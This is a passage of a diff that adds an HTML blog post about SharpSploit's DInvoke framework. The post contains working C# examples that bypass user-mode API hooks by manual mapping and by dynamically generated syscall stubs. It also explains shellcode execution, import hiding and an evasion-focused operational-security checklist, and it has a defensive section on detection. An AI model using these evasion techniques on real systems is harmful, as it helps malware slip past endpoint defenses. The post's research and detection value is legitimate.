+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Search by name --&gt; OpenProcess"</span><span class="p">);</span>
+            <span class="n">moduleDetails</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">ManualMap</span><span class="p">.</span><span class="n">Overload</span><span class="p">.</span><span class="nf">OverloadModule</span><span class="p">(</span><span class="s">"C:\\Windows\\System32\\kernel32.dll"</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Module Base : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">moduleDetails</span><span class="p">.</span><span class="n">ModuleBase</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">//Call OpenProcess</span>
+            <span class="n">hProc</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">CallMappedDLLModuleExport</span><span class="p">(</span><span class="n">moduleDetails</span><span class="p">.</span><span class="n">PEINFO</span><span class="p">,</span> <span class="n">moduleDetails</span><span class="p">.</span><span class="n">ModuleBase</span><span class="p">,</span> <span class="s">"OpenProcess"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Delegates</span><span class="p">.</span><span class="n">OpenProcess</span><span class="p">),</span> <span class="n">paramaters</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Process Handle : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">hProc</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">// Pause execution</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Pausing execution.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+
+            <span class="c1">//////////////////////////////////////////////////////////////////////////////////////////////////////////</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[!] Test complete!"</span><span class="p">);</span>
+
+            <span class="c1">// Pause execution</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Pausing execution.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>To test this, we will use the tool <a href="http://www.rohitab.com/apimonitor">API Monitor v2</a> to hook <code class="language-plaintext highlighter-rouge">kernel32.dll!OpenProcess</code>. Then we will run the demo through API Monitor. You may observe which of our calls to <code class="language-plaintext highlighter-rouge">OpenProcess</code> were caught in hooks by watching for those that are called with the PROCESS_ALL_ACCESS flag. As you will see, API Monitor successfully catches the API call when it is performed with PInvoke. However, it does NOT succeed when we use DInvoke or Manual Mapping. You may watch the video on Vimeo to see this in action.</p>
+
+<div src="cid:frame-8ABF72FA5072DD2D9DAC2BC9B21B92EA@mhtml.blink" width="640" height="360" frameborder="0" allow="autoplay; fullscreen" allowfullscreen="" data-original-tag="iframe"></div>
+<p><a href="https://vimeo.com/406589341">SharpSploit: Bypassing API Hooks via DInvoke and Manual Mapping</a> from <a href="https://vimeo.com/user98951060">The Wover</a> on <a href="https://vimeo.com/">Vimeo</a>.</p>
+
+<h4 id="example---syscall-execution">Example - Syscall Execution</h4>
+
+<p>You may also bypass hooks with syscalls… let’s show you how to use them. First, we use <code class="language-plaintext highlighter-rouge">GetSyscallStub</code> to <del>steal</del> borrow the machine code of the syscall wrapper within <code class="language-plaintext highlighter-rouge">ntdll.dll</code> for <code class="language-plaintext highlighter-rouge">NtOpenProcess</code>. This ensures that we don’t have to maintain a library of syscall IDs, since the appropriate ID will be embedded in the copy of <code class="language-plaintext highlighter-rouge">ntdll.dll</code> that resides on the local system. Then, we execute the resulting machine code using a delegate representing <code class="language-plaintext highlighter-rouge">NtOpenProcess</code>. Incidentally, because we are using a delegate to execute raw machine code, this also demonstrates how you could execute shellcode in the current process while passing in parameters and getting a return value.</p>
+
+<p>Note: Syscall execution does not currently work in WOW64 processes. Please see the note at the bottom of this post for details.</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">///Author: b33f (@FuzzySec, Ruben Boonen)</span>
+<span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">SpTestcase</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="p">[</span><span class="n">Flags</span><span class="p">]</span>
+        <span class="k">public</span> <span class="k">enum</span> <span class="n">ProcessAccessFlags</span> <span class="p">:</span> <span class="kt">uint</span>
+        <span class="p">{</span>
+            <span class="n">All</span> <span class="p">=</span> <span class="m">0x001F0FFF</span><span class="p">,</span>
+            <span class="n">Terminate</span> <span class="p">=</span> <span class="m">0x00000001</span><span class="p">,</span>
+            <span class="n">CreateThread</span> <span class="p">=</span> <span class="m">0x00000002</span><span class="p">,</span>
+            <span class="n">VirtualMemoryOperation</span> <span class="p">=</span> <span class="m">0x00000008</span><span class="p">,</span>
+            <span class="n">VirtualMemoryRead</span> <span class="p">=</span> <span class="m">0x00000010</span><span class="p">,</span>
+            <span class="n">VirtualMemoryWrite</span> <span class="p">=</span> <span class="m">0x00000020</span><span class="p">,</span>
+            <span class="n">DuplicateHandle</span> <span class="p">=</span> <span class="m">0x00000040</span><span class="p">,</span>
+            <span class="n">CreateProcess</span> <span class="p">=</span> <span class="m">0x000000080</span><span class="p">,</span>
+            <span class="n">SetQuota</span> <span class="p">=</span> <span class="m">0x00000100</span><span class="p">,</span>
+            <span class="n">SetInformation</span> <span class="p">=</span> <span class="m">0x00000200</span><span class="p">,</span>
+            <span class="n">QueryInformation</span> <span class="p">=</span> <span class="m">0x00000400</span><span class="p">,</span>
+            <span class="n">QueryLimitedInformation</span> <span class="p">=</span> <span class="m">0x00001000</span><span class="p">,</span>
+            <span class="n">Synchronize</span> <span class="p">=</span> <span class="m">0x00100000</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="nf">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">struct</span> <span class="nc">OBJECT_ATTRIBUTES</span>
+        <span class="p">{</span>
+            <span class="k">public</span> <span class="kt">ulong</span> <span class="n">Length</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">RootDirectory</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">ObjectName</span><span class="p">;</span>
+            <span class="k">public</span> <span class="kt">ulong</span> <span class="n">Attributes</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">SecurityDescriptor</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">SecurityQualityOfService</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="nf">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">struct</span> <span class="nc">CLIENT_ID</span>
+        <span class="p">{</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">UniqueProcess</span><span class="p">;</span>
+            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">UniqueThread</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="nf">UnmanagedFunctionPointer</span><span class="p">(</span><span class="n">CallingConvention</span><span class="p">.</span><span class="n">StdCall</span><span class="p">)]</span>
+        <span class="k">public</span> <span class="k">delegate</span> <span class="n">UInt32</span> <span class="nf">NtOpenProcess</span><span class="p">(</span>
+            <span class="k">ref</span> <span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span>
+            <span class="n">ProcessAccessFlags</span> <span class="n">processAccess</span><span class="p">,</span>
+            <span class="k">ref</span> <span class="n">OBJECT_ATTRIBUTES</span> <span class="n">objAttribute</span><span class="p">,</span>
+            <span class="k">ref</span> <span class="n">CLIENT_ID</span> <span class="n">clientid</span><span class="p">);</span>
+
+        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="c1">// Details</span>
+            <span class="n">String</span> <span class="n">testDetail</span> <span class="p">=</span> <span class="s">@"
+            #=================&gt;
+            # Hello there!
+            # I dynamically generate a Syscall stub
+            # for NtOpenProcess and then open a
+            # handle to a PID.
+            #=================&gt;
+            "</span><span class="p">;</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">testDetail</span><span class="p">);</span>
+
+            <span class="c1">// Read PID from args</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] PID: "</span> <span class="p">+</span> <span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+
+            <span class="c1">// Create params for Syscall</span>
+            <span class="n">IntPtr</span> <span class="n">hProc</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
+            <span class="n">OBJECT_ATTRIBUTES</span> <span class="n">oa</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">OBJECT_ATTRIBUTES</span><span class="p">();</span>
+            <span class="n">CLIENT_ID</span> <span class="n">ci</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">CLIENT_ID</span><span class="p">();</span>
+            <span class="n">Int32</span> <span class="n">ProcID</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(!</span><span class="n">Int32</span><span class="p">.</span><span class="nf">TryParse</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">],</span> <span class="k">out</span> <span class="n">ProcID</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">ci</span><span class="p">.</span><span class="n">UniqueProcess</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)(</span><span class="n">ProcID</span><span class="p">);</span>
+
+            <span class="c1">// Generate syscall stub</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Generating NtOpenProcess syscall stub.."</span><span class="p">);</span>
+            <span class="n">IntPtr</span> <span class="n">pSysCall</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetSyscallStub</span><span class="p">(</span><span class="s">"NtOpenProcess"</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] pSysCall    : "</span> <span class="p">+</span> <span class="n">String</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="p">(</span><span class="n">pSysCall</span><span class="p">).</span><span class="nf">ToInt64</span><span class="p">()));</span>
+
+            <span class="c1">// Use delegate on pSysCall</span>
+            <span class="n">NtOpenProcess</span> <span class="n">fSyscallNtOpenProcess</span> <span class="p">=</span> <span class="p">(</span><span class="n">NtOpenProcess</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="nf">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="n">pSysCall</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">NtOpenProcess</span><span class="p">));</span>
+            <span class="n">UInt32</span> <span class="n">CallRes</span> <span class="p">=</span> <span class="nf">fSyscallNtOpenProcess</span><span class="p">(</span><span class="k">ref</span> <span class="n">hProc</span><span class="p">,</span> <span class="n">ProcessAccessFlags</span><span class="p">.</span><span class="n">All</span><span class="p">,</span> <span class="k">ref</span> <span class="n">oa</span><span class="p">,</span> <span class="k">ref</span> <span class="n">ci</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] NtStatus    : "</span> <span class="p">+</span> <span class="n">String</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">CallRes</span><span class="p">));</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">CallRes</span> <span class="p">==</span> <span class="m">0</span><span class="p">)</span> <span class="c1">// STATUS_SUCCESS</span>
+            <span class="p">{</span>
+                <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Proc Handle : "</span> <span class="p">+</span> <span class="n">String</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="p">(</span><span class="n">hProc</span><span class="p">).</span><span class="nf">ToInt64</span><span class="p">()));</span>
+            <span class="p">}</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Pausing execution.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+</code></pre></div></div>
+
+<p><img src="https://thewover.github.io/images/DInvoke/3_Syscall.png" alt="_config.yml" title="Executing syscalls with DInvoke"></p>
+
+<p>Using syscalls this way will bypass ALL kinds of user-mode API hooking. You may test this in API Monitor the same way that we showed bypassing hooks with DInvoke and Manual Mapping.</p>
+
+<p>Note: smelly_vx and am0nsec recently published a technique called Hell’s Gate for invoking syscalls dynamically. It is an excellent paper and technique that you should <a href="https://vxug.fakedoma.in/papers/hells-gate.pdf">go and read</a>. Additionally modexp recently <a href="https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/">published a post</a> on dynamically invoking syscalls that takes advantage of the built-in Windows Debugging Engine to dissassemble syscall stubs, find their ID, and invoke them.</p>
+
+<h3 id="avoid-suspicious-imports">Avoid Suspicious Imports</h3>
+
+<p>As previously mentioned, you can avoid statically importing suspicious API calls. If, for example, you wanted to import <code class="language-plaintext highlighter-rouge">MiniDumpWriteDump</code> from <code class="language-plaintext highlighter-rouge">Dbghelp.dll</code> you could use DInvoke to dynamically load the DLL and invoke the API call. If you were then to inspect your .NET Assembly in an Assembly dissassembler (such as dnSpy), you would find that <code class="language-plaintext highlighter-rouge">MiniDumpWriteDump</code> is not referenced in its import table.</p>
+
+<h3 id="unknown-execution-flow-at-compile-time">Unknown Execution Flow at Compile Time</h3>
+
+<p>Sometimes, you may want to write a program where the flow of execution is unknown or undefined at build time. Rather than the program being one sequential procedure, maybe it uses dynamically loaded plugins, is self-modifying, or provides an interface to the user that allows them to specify how execution should proceed. All of these are cases that would typically be considered dangerous and… also unwise life choices. But, if you write malware, then that description probably applies to the rest of your life as well. :-P DInvoke allows you to make unwise life choices by dynamically invoking arbitrary unmanaged modules without specifying them at build-time.</p>
+
+<h3 id="shellcode-execution">Shellcode Execution</h3>
+
+<p>A Delegate is effectively a wrapper for a function pointer. Shellcode is machine code that can be executed independently. As such, if you have a pointer to it, you can execute it. SharpSploit already took advantage of delegates in order to execute shellcode in this way in the <code class="language-plaintext highlighter-rouge">SharpSploit.Execution.ShellCode.ShellCodeExecute</code> function. You could also execute shellcode using the <code class="language-plaintext highlighter-rouge">DynamicFunctionInvoke</code> method within DInvoke. Furthermore, you could use it to execute shellcode that expects parameters to be passed in or attempts to return a value.</p>
+
+<h2 id="integrating-dinvoke-into-tools">Integrating DInvoke into Tools</h2>
+
+<p>You can use DInvoke by downloading SharpSploit today. Ryan Cobb has an <a href="https://cobbr.io/SharpGen.html">excellent blog post</a> that covers how to integrate existing .NET Assemblies such as SharpSploit into your red team tools. Alternatively, if you don’t want to embed SharpSploit into your tool, you can copy and paste the files composing DInvoke into your project and reference them. An example would be <a href="https://github.com/med0x2e/NoAmci">NoAmci</a> by med0x2e.</p>
+
+<h2 id="detection">Detection</h2>
+
+<p>DInvoke provides many operational security advantages to offensive tool developers. Fortunately for defenders there are measures you can take to detect the DInvoke or the techniques that it enables, though it is not all sunshine, lollipops and rainbows. Nothing is undetectable. Like a ripple in a pond, every action you take on-target produces anomalies even if they are ephemeral. DInvoke is no exception.</p>
+
+<p>The examples provided below are available in the GitHub repo for our Blue Hat IL talk: (https://github.com/FuzzySecurity/BlueHatIL-2020/tree/master/Detection)</p>
+
+<h3 id="correlating-module-load-events">Correlating Module Load Events</h3>
+
+<p>Unless you manually map the modules that you wish to execute, loading DLLs will generate Image Load (“modload”) events. These events can be captured using SysMon, ETW, WMI, and many other systems and can be valuable components of detection logic. If you (or more likely your vendor) have insight into what modules are commonly loaded by processes, then you can recognize when a process loads a module that it has never loaded before. Since anomalous module loads can be indicators of code injection, many vendors watch for them to find in-memory malware. DInvoke is no exception. Using <code class="language-plaintext highlighter-rouge">DynamicAPIInvoke</code> can generate these anomalous module load events when the DLL referenced has not yet been loaded into the current process.</p>
+
+<p>While Module Overloading is covert in that it hides a module in memory backed by a legitimate file on-disk, it does generate a modload event for the decoy file that backs the memory. Since that file is randomly chosen (and will not be one already loaded), it will probably not be a module that is <em>normally</em> loaded by the process and is therefore anomalous.</p>
+
+<p>Incidentally, this sort of detection can also be used to reliably detect injection of .NET Assemblies into processes that do not normally load the CLR such as unmanaged executables. To demonstrate, see what modules are loaded by <code class="language-plaintext highlighter-rouge">notepad.exe</code> before injecting a .NET Assembly (such as something using SharpSploit) into it:</p>
+
+<p><img src="https://thewover.github.io/images/DInvoke/ModuleLoadCorrelation_pre.png" alt="_config.yml" title="Correlating Module Loads - pre injection"></p>
+
+<p>Now, after injecting a .NET Assembly into the process, you can see that various .NET runtime DLLs were loaded into it.</p>
+
+<p><img src="https://thewover.github.io/images/DInvoke/ModuleLoadCorrelation_post.png" alt="_config.yml" title="Correlating Module Loads - post injection"></p>
+
+<h3 id="memory-scanning">Memory Scanning</h3>
+
+<p>While Manual Mapping has the benefit of bypassing API hooks and not generating modload events, it has the disadvantage of producing anomalous memory artifacts. Random executable PE files floating around in dynamically allocated memory is not exactly normal. Since memory scanning is a complex topic that is too nuanced to discuss here, I will simply refer you to an open source memory scanner that successfully detects SharpSploit’s manual mapping and Module Overloading. hasherezade’s <a href="https://github.com/hasherezade/pe-sieve">pe-sieve project</a> can detect modules that have been mapped into dynamically allocated memory or used to replace modules loaded into file-backed memory and dump them from the process.</p>
+
+<p><img src="https://thewover.github.io/images/DInvoke/MCpmBiUD.jpg_large.jpg" alt="_config.yml" title="Detection with pe-sieve"></p>
+
+<p>Memory scanning and evading it is a constant cat-and-mouse game. So, with some creativity, you could probably evade some of hasherezade’s techniques until she finds your malware and dissects it to add to her collection. :-) But I will leave that as an exercise to the reader. ;-)</p>
+
+<h3 id="etw-event-tracing-for-windows">ETW (Event Tracing for Windows)</h3>
+
+<p>Event Tracing for Windows is a powerful framework for monitoring Windows. Several event providers are available in Windows by default. They can be used by vendors to monitor for suspicious events. Or, they can be leveraged through a tool such as <a href="https://www.fireeye.com/blog/threat-research/2019/03/silketw-because-free-telemetry-is-free.html">SilkETW</a> to log events to <a href="https://medium.com/threat-hunters-forge/threat-hunting-with-etw-events-and-helk-part-1-installing-silketw-6eb74815e4a0">Windows Event Log</a> or a <a href="https://medium.com/threat-hunters-forge/threat-hunting-with-etw-events-and-helk-part-2-shipping-etw-events-to-helk-16837116d2f5">SIEM</a>. One of the default providers allows for introspection of the .NET Common Language Runtime. It can be used to watch for Assembly loads (including from memory!), suspicious IL signatures, and more. In our GitHub repo, we provide an <a href="https://github.com/FuzzySecurity/BlueHatIL-2020/blob/master/Detection/SilkETW_SharpSploit_Yara.txt">example</a> SilkETW <a href="https://github.com/FuzzySecurity/BlueHatIL-2020/blob/master/Detection/SilkETW_SharpSploit_Yara.json">config</a> and Yara <a href="https://github.com/FuzzySecurity/BlueHatIL-2020/blob/master/Detection/SilkETW_SharpSploit.yar">signatures</a> that demonstrate leveraging the .NET Runtime ETW provider to detect usage of DInvoke.</p>
+
+<p><img src="https://thewover.github.io/images/DInvoke/SilkETW_SharpSploit_Yara.png" alt="_config.yml" title="SharpSploit Yara rules for SilkETW"></p>
+
+<p>It is important to note that ETW <a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/">can</a> <a href="https://twitter.com/FuzzySec/status/1240659417219170304">be</a> <a href="https://github.com/outflanknl/TamperETW">bypassed</a> <a href="https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63">several</a> <a href="https://modexp.wordpress.com/2020/04/08/red-teams-etw/">ways</a>. However, it can still be an incredibly valuable data source for detecting malicious behavior, both when performed in managed and native code.</p>
+
+<h3 id="application-introspection-hooking">Application Introspection (Hooking)</h3>
+
+<p>While DInvoke does provide mechanisms for bypassing userland API hooking, it is up to the developer to use them effectively. As such, userland API hooking may still be effective against it. To demonstrate this, b33f wrote an example Frida <a href="https://github.com/FuzzySecurity/BlueHatIL-2020/blob/master/Detection/Fermion_MapModuleToMemory.js">script</a> that hooks <code class="language-plaintext highlighter-rouge">NtWriteVirtualMemory</code> and <code class="language-plaintext highlighter-rouge">NtCreateThreadEx</code>. When the former is called, the script checks to see if the data being written is in the format of a PE file. If so, it keeps track of the block of memory. Afterwards, whenever the latter is called, the script checks to see whether the new thread has a start address within the dynamically mapped PE file. If so, it triggers an alert.</p>
+
+<p><img src="https://thewover.github.io/images/DInvoke/Fermion_SharpSploit_MapModuleToMemory.png" alt="_config.yml" title="Fermion hooking"></p>
+
+<p>It is also worth noting that DInvoke is entirely incapable of evading kernel-level hooking of syscalls. The same is true for all malware that runs from user-land. As such, any drivers (such as an EDR component) that hook syscalls will be unaffected.</p>
+
+<h2 id="operational-security">Operational Security</h2>
+<p>DInvoke is, fundamentally, a defense evasion toolbox for .NET offensive tool developers. Whether you can use those tools effectively is up to you. Generally, follow these rules of thumb:</p>
+
+<ul>
+  <li>Use DInvoke instead of PInvoke.</li>
+  <li>Choose to avoid API hooks.</li>
+  <li>Avoid module load events.</li>
+  <li>Prefer to hide code in locations it would normally exist, such as file-backed Sections.</li>
+  <li>When done with manually mapped modules, free them from memory to avoid memory scanners.</li>
+  <li>No design decision will ensure that your tools are undetectable. Build a threat model for your offensive tools. What detection mechanisms are they likely to face? Consider what the operational tradeoffs are of each decision you have made for how you load and execute code on-target. Base your design decisions on how those tradeoffs balance in favor of your tools not getting caught.</li>
+</ul>
+
+<h2 id="room-for-improvement">Room for Improvement</h2>
+
+<p>DInvoke represents a powerful and flexible new framework for post-exploitation on Windows. But, there is still plenty of room for improvement. We have a list of features that we would like to add. If you have more, feel free to submit a PR or request the feature.</p>
+
+<ul>
+  <li>Provide arguments to EXEs invoked from memory (more complicated than it sounds)</li>
+  <li>Fix manual mapping and syscall stub generation support for WOW64 processes. (It’s slightly broken right now and we’re not sure why. It works in 32-bit processes on 32-bit machines, and 64-bit processes on 64-bit machines. But it doesn’t work in WOW64 processes on 64-bit machines. Something seems to go wrong during the WOW64 transition for syscalls. If you know how to fix this please let us know :-D Otherwise, we will fix it when we have the time.)</li>
+  <li>Add a function to Module Overload a module in memory and map the result into a different process.</li>
+  <li>A generic function for hooking an unmanaged API call with a managed function (Delegate).</li>
+</ul>
+
+<h1 id="conclusions">Conclusions</h1>
+
+<p>DInvoke is a framework for dynamically executing unmanaged code from managed code without using Pinvoke. It is our hope that it will provide you with the flexibility necessary to choose not just what your tools do, but how they do it. Whether you can use it to avoid detection is up to you.</p>
+
+<p>Next up, an in-depth exploration of how to leverage SharpSploit to execute PE modules from memory, either for post-exploitation or for hook evasion.</p>
+
+  </div>
+
+  <div class="date">
+    Written on June  9, 2020
+  </div>
+
+  
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        
+      </div>
+    </div>
+
+    
+
+  
+
+</body></html>
